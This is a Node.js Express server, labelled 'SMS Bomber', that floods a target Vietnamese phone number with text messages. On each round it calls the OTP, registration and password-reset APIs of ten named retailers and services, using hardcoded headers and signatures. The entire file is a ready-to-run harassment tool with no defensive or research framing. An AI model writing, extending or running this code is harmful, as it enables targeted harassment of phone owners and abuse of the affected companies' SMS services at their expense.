const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Danh sách endpoint SMS (đã lọc bớt, chỉ giữ các API còn sống)
const endpoints = [
  {
    name: 'Tokyolife',
    fn: async (phone) => {
      await axios.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', {
        phone_number: phone, name: 'Nguyen Van A', password: 'Abc123456', email: 'spam@example.com',
        birthday: '2000-01-01', gender: 'male'
      }, { headers: { 'signature': 'c1336d4c72c0b857cdd6aab4de261aa3', 'timestamp': Date.now().toString(), 'origin': 'https://tokyolife.vn', 'content-type': 'application/json' } });
    }
  },
  {
    name: 'Gumac',
    fn: async (phone) => {
      await axios.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', { phone },
        { headers: { 'origin': 'https://gumac.vn', 'referer': 'https://gumac.vn/', 'content-type': 'application/json' } });
    }
  },
  {
    name: 'Kingfoodmart',
    fn: async (phone) => {
      await axios.post('https://api.onelife.vn/v1/gateway/', {
        operationName: 'SendOTP',
        variables: { phone },
        query: 'mutation SendOTP($phone: String!) { sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) { otpTrackingId __typename } }'
      }, { headers: { 'content-type': 'application/json', 'domain': 'kingfoodmart', 'origin': 'https://kingfoodmart.com' } });
    }
  },
  {
    name: 'FPT Shop',
    fn: async (phone) => {
      await axios.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', {
        fromSys: 'WEBKHICT', otpType: '0', phoneNumber: phone
      }, { headers: { 'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14', 'content-type': 'application/json', 'origin': 'https://fptshop.com.vn' } });
    }
  },
  {
    name: 'Winmart',
    fn: async (phone) => {
      await axios.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', {
        firstName: 'Taylor Jasmine', phoneNumber: phone, masanReferralCode: '', dobDate: '2005-08-05', gender: 'Male'
      }, { headers: { 'authorization': 'Bearer undefined', 'content-type': 'application/json', 'origin': 'https://winmart.vn', 'x-api-merchant': 'WCM' } });
    }
  },
  {
    name: 'Sapo',
    fn: async (phone) => {
      await axios.post('https://www.sapo.vn/fnb/sendotp', `phonenumber=${phone}`,
        { headers: { 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://www.sapo.vn', 'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html' } });
    }
  },
  {
    name: 'GHN',
    fn: async (phone) => {
      await axios.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', { phone, type: 'register' },
        { headers: { 'content-type': 'application/json', 'origin': 'https://sso.ghn.vn' } });
    }
  },
  {
    name: 'Emart',
    fn: async (phone) => {
      await axios.post('https://emartmall.com.vn/index.php?route=account/register/smsRegister', `mobile=${phone}`,
        { headers: { 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://emartmall.com.vn' } });
    }
  },
  {
    name: 'Shopiness',
    fn: async (phone) => {
      await axios.post('https://shopiness.vn/ajax/user', `action=verify-registration-info&phoneNumber=${phone}&refCode=`,
        { headers: { 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://shopiness.vn' } });
    }
  },
  {
    name: 'VayVND',
    fn: async (phone) => {
      await axios.post('https://api.vayvnd.vn/v2/users/password-reset', { login: phone, trackingId: '8Y6vKPEgdnxhamRfAJw7IrW3nwVYJ6BHzIdygaPd1S9urrRIVnFibuYY0udN46Z3' },
        { headers: { 'content-type': 'application/json', 'origin': 'https://vayvnd.vn', 'site-id': '3' } });
    }
  }
];

app.post('/api/spam', async (req, res) => {
  const { phone, count } = req.body;
  if (!phone || !count) return res.status(400).json({ error: 'Thiếu phone hoặc count' });

  // Kiểm tra định dạng số điện thoại Việt Nam
  const regex = /^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$/;
  if (!regex.test(phone)) return res.status(400).json({ error: 'Số điện thoại không hợp lệ' });

  const results = [];
  let sent = 0;

  for (let i = 0; i < count; i++) {
    const promises = endpoints.map(async (ep) => {
      try {
        await ep.fn(phone);
        return { name: ep.name, status: 'ok' };
      } catch (err) {
        return { name: ep.name, status: 'fail', error: err.message };
      }
    });

    const roundResults = await Promise.allSettled(promises);
    roundResults.forEach(r => {
      if (r.status === 'fulfilled' && r.value.status === 'ok') sent++;
      results.push(r.status === 'fulfilled' ? r.value : { name: 'unknown', status: 'fail' });
    });

    // Nghỉ 2 giây giữa các vòng
    await new Promise(r => setTimeout(r, 2000));
  }

  res.json({ totalSent: sent, totalAttempts: count * endpoints.length, details: results });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`SMS Bomber running on port ${PORT}`);
});
